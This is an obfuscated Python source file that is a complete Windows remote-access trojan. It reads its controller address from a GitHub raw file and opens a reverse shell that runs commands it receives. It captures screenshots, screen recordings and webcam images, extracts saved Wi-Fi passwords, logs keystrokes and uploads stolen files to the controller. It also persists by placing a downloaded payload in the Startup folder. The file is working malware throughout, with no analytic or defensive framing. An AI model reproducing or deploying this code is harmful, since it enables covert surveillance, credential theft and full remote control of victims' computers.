import urllib.request,subprocess,socket,time,os,json,base64,shutil,re
from datetime import datetime
TGzQFIowxkbD = ""
mwXboNPZdYVNgn = ""
CYVjBREYuTSiBjOglSDvfck = "13.11.25.0"
APDCUMbPiCpzob = True
bZXIPmCSStEqS = "!"
nkWyhJrNBIU = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
GPfOBadynjemudERePyqb = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
tlNLRxBqkWpoQVpMNR = os.path.expanduser("~\\AppData\\Local\\")
vWLUtFeZHRGKUSNziRNNu = os.path.expanduser("~\\AppData\\Roaming\\")
MinbzcQxwhacuJIyIygmYM = ""
def jMiUJnJApCWRDCEuxTcED(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def vDVvuKbsZycilepk(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	hOYQMamyR = data.decode("utf-8").replace("\n","")
	if not hOYQMamyR.startswith(bZXIPmCSStEqS):
		proc = subprocess.run(hOYQMamyR, shell=True, capture_output=True)
		nOJuzaLkg = proc.stdout + proc.stderr
		pzBhopjpMfqBDbv(s, nOJuzaLkg)
		return
	tFHtjqyVsyXINCQfGLTrxSA = hOYQMamyR.split(" ")[0][1:]
	args = " ".join(hOYQMamyR.split()[1:]).split()
	if tFHtjqyVsyXINCQfGLTrxSA == "cd":
		moveDirectory(s, hOYQMamyR[4:])
	elif tFHtjqyVsyXINCQfGLTrxSA == "screenshot":
		IstRKsUSXgUkCYQmwtpx(s)
	elif tFHtjqyVsyXINCQfGLTrxSA == "webcam":
		QqFedSxffGlsal(s, args)
	elif tFHtjqyVsyXINCQfGLTrxSA == "download":
		VSUUBmdFImLvgEgi(s, hOYQMamyR)
	elif tFHtjqyVsyXINCQfGLTrxSA == "wifi":
		fIokeoMdzA(s)
	elif tFHtjqyVsyXINCQfGLTrxSA == "screenrecord":
		ChgdqIagYQQks(s, args)
	elif tFHtjqyVsyXINCQfGLTrxSA == "update":
		fkgwVdjLJyolCjMNcH(s)
	elif tFHtjqyVsyXINCQfGLTrxSA == "basename":
		pzBhopjpMfqBDbv(s, os.path.basename(__file__))
	else:
		pzBhopjpMfqBDbv(s,"")
def moveDirectory(s, path):
	try:
		os.chdir(path)
		pzBhopjpMfqBDbv(s,"")
	except:
		pzBhopjpMfqBDbv(s, "[!] 404")
def VSUUBmdFImLvgEgi(s, hOYQMamyR):
	wVxMvXZZwDzTcuJajG = hOYQMamyR.replace(bZXIPmCSStEqS+"download ","").split(",")
	nOJuzaLkgs = ""
	for f in wVxMvXZZwDzTcuJajG:
		nOJuzaLkgs += mtHbIOLYZgUPf(f, "api/file/", { "type":os.path.splitext(f)[1] })
	pzBhopjpMfqBDbv(s, nOJuzaLkgs)
def IstRKsUSXgUkCYQmwtpx(s):
	from PIL import ImageGrab
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	AjLpKle = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(AjLpKle)
	image.close()
	nOJuzaLkg = mtHbIOLYZgUPf(AjLpKle, "api/sscap")
	os.remove(AjLpKle)
	pzBhopjpMfqBDbv(s, nOJuzaLkg)
def QqFedSxffGlsal(s, args):
	import cv2
	cameraNumber = 0
	fname = "wc.jpg"
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		cam = cv2.VideoCapture(cameraNumber)
		_, frame = cam.read()
		cv2.imwrite(tlNLRxBqkWpoQVpMNR+fname, frame)
		cam.release()
		r=mtHbIOLYZgUPf(tlNLRxBqkWpoQVpMNR+fname,"api/wc")
		os.remove(tlNLRxBqkWpoQVpMNR+fname)
		pzBhopjpMfqBDbv(s, r)
	except Exception as e:
		pzBhopjpMfqBDbv(s, "[!] 404: "+str(e))
def ChgdqIagYQQks(s, args):
	import imageio
	from PIL import ImageGrab
	cbMFpVckshOBgnksxrJYc = 15
	if not args == []:
		try: cbMFpVckshOBgnksxrJYc = int(args[0])
		except: pass
	bvJyojBpPujyoEzpLe = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	apbXoeUWw = []
	fps = 11
	numFrames = cbMFpVckshOBgnksxrJYc * fps
	for _ in range(numFrames):
		apbXoeUWw.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(bvJyojBpPujyoEzpLe, apbXoeUWw, fps=fps, quality=8)
	r=mtHbIOLYZgUPf(bvJyojBpPujyoEzpLe, "api/screc")
	os.remove(bvJyojBpPujyoEzpLe)
	pzBhopjpMfqBDbv(s, r)
def mtHbIOLYZgUPf(IRKYumsbI, RVzMtgJn, vFgQiefbERhyahivLlDt=None):
	import requests
	if not os.path.isfile(IRKYumsbI):
		return "[!] 404: "+IRKYumsbI+"\n"
	headers = {"user":os.getlogin()}
	if vFgQiefbERhyahivLlDt is not None:
		headers = {**headers, **vFgQiefbERhyahivLlDt}
	f = open(IRKYumsbI, "rb")
	requests.post("http://"+TGzQFIowxkbD+":5555/"+RVzMtgJn,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200"
def CLxHZwXYpPmaSs(ujbGsUlcewzYT, RVzMtgJn):
	import requests
	if ujbGsUlcewzYT.strip() == "":
		return "[!] 204"
	requests.post("http://"+TGzQFIowxkbD+":5555/"+RVzMtgJn,
		data=ujbGsUlcewzYT,
		headers={"user":os.getlogin()})
	return "[+] 200"
def fkgwVdjLJyolCjMNcH(s):
	h, p, v = mkFFTLdhqIMVKUFWFRqqSN(True)
	if (v != CYVjBREYuTSiBjOglSDvfck):
		xUGhKUHYhiWukRA(v)
		pzBhopjpMfqBDbv(s, "[+] 200")
	else:
		pzBhopjpMfqBDbv(s, "[-] 304")
def fIokeoMdzA(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		pzBhopjpMfqBDbv(s, "[!] 500")
		return
	GzEqTEEdxvWPqNxfXg = ""
	for p in profiles:
		try: GzEqTEEdxvWPqNxfXg+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
		except: GzEqTEEdxvWPqNxfXg+=f"    {p} - N/A"
	pzBhopjpMfqBDbv(s, GzEqTEEdxvWPqNxfXg)
def xUGhKUHYhiWukRA(jjyCIfwy):
	import requests
	global APDCUMbPiCpzob
	prKokGEQMOPALnXOY = os.path.basename(__file__)
	fileType = prKokGEQMOPALnXOY.split(".")[-1]
	GatPYHrmIpoZENLZbmS = prKokGEQMOPALnXOY.split(".")[0]+"."+jjyCIfwy+".pyw" if fileType.startswith("py") else ".exe"
	LvSgDcbxnHZltyTHGmp = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), GatPYHrmIpoZENLZbmS)
	if not os.path.isfile(LvSgDcbxnHZltyTHGmp):
		with open(LvSgDcbxnHZltyTHGmp, "w+") as f:
			f.write(requests.get(GPfOBadynjemudERePyqb+"file."+ "pyw" if LvSgDcbxnHZltyTHGmp.split(".")[-1].startswith("py") else "exe").text)
	else:
		APDCUMbPiCpzob = False
def mkFFTLdhqIMVKUFWFRqqSN(force=False):
	global TGzQFIowxkbD, mwXboNPZdYVNgn
	if force or TGzQFIowxkbD == "" or mwXboNPZdYVNgn == "":
		while True:
			try:
				with urllib.request.urlopen(nkWyhJrNBIU) as response:
					data = response.read().decode("utf-8").replace("\n","").split(":")
					TGzQFIowxkbD = data[0].strip()
					mwXboNPZdYVNgn = data[1].strip()
					jjyCIfwy = data[2].strip()
					return TGzQFIowxkbD, mwXboNPZdYVNgn, jjyCIfwy
			except:
				time.sleep(10)
def yPgreYFYykxApTJgamFi():
	try:
		gfYrSclReoHvcHwl = "settings.xpb"
		WntqkPcc = sorted([file for file in os.listdir(tlNLRxBqkWpoQVpMNR) if os.path.isfile(tlNLRxBqkWpoQVpMNR+"\\"+file) and file.endswith(gfYrSclReoHvcHwl.split(".")[-1])])
		if gfYrSclReoHvcHwl in WntqkPcc:
			WntqkPcc.remove(gfYrSclReoHvcHwl)
		fhJAUjnMKdcFbNqtgFwJvW = os.path.join(tlNLRxBqkWpoQVpMNR,gfYrSclReoHvcHwl)
		if len(WntqkPcc) > 0:
			with open(fhJAUjnMKdcFbNqtgFwJvW, "ab+") as f:
				for file in WntqkPcc:
					temp = os.path.join(tlNLRxBqkWpoQVpMNR,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		mtHbIOLYZgUPf(fhJAUjnMKdcFbNqtgFwJvW, "api/log")
		if os.path.isfile(fhJAUjnMKdcFbNqtgFwJvW):
			os.remove(fhJAUjnMKdcFbNqtgFwJvW)
	except:
		pass
def eLcLFIXtnpeMFbAHYHBUy():
	from pynput.keyboard import Listener
	import logging
	logging.basicConfig(filename=(tlNLRxBqkWpoQVpMNR+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def QXPopHfGJb(k):
		logging.info(str(k))
	k=Listener(on_press=QXPopHfGJb)
	VGFbBhWISflkTHnNjFV = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in VGFbBhWISflkTHnNjFV:
		l.setLevel(logging.CRITICAL)
	k.start()
def pzBhopjpMfqBDbv(clientSocket, ujbGsUlcewzYT):
	formattedData = b""
	if type(ujbGsUlcewzYT) == bytes:
		formattedData += ujbGsUlcewzYT
	else:
		formattedData += bytes(ujbGsUlcewzYT, "utf-8")
	formattedData += bytes("\n"+MinbzcQxwhacuJIyIygmYM+os.getcwd().replace("\\","/")+" >> ", "utf-8")
	clientSocket.sendall(formattedData)
def EPymVMlIMMt():
	global MinbzcQxwhacuJIyIygmYM
	h, p, v = mkFFTLdhqIMVKUFWFRqqSN()
	try: yPgreYFYykxApTJgamFi()
	except: pass
	try:
		if CYVjBREYuTSiBjOglSDvfck != v:
			xUGhKUHYhiWukRA(v)
	except: pass
	try:
		if APDCUMbPiCpzob:
			eLcLFIXtnpeMFbAHYHBUy()
		pass
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	MinbzcQxwhacuJIyIygmYM = ("(old)"if CYVjBREYuTSiBjOglSDvfck!=v else "")+"["+CYVjBREYuTSiBjOglSDvfck+"] "+os.getlogin()+" - "
	while True:
		JGDsLDhaGqYYa=False
		try:
			s=jMiUJnJApCWRDCEuxTcED(h, p)
			pzBhopjpMfqBDbv(s, "")
			while not JGDsLDhaGqYYa:
				try: JGDsLDhaGqYYa=vDVvuKbsZycilepk(s)
				except Exception as e:
					pzBhopjpMfqBDbv(s, str(e))
			s.close()
		except:
			pass
		time.sleep(5)
EPymVMlIMMt()
